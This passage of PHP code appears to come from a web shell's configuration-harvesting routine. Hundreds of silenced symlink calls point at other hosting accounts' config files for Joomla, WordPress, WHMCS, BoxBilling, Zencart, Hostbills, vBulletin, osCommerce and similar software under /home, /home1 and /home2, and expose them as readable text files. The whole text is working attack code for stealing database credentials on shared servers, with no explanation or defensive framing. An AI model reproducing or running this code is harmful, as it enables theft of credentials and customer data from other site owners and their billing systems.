@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home1

@symlink('/home1/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home1/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home2

@symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
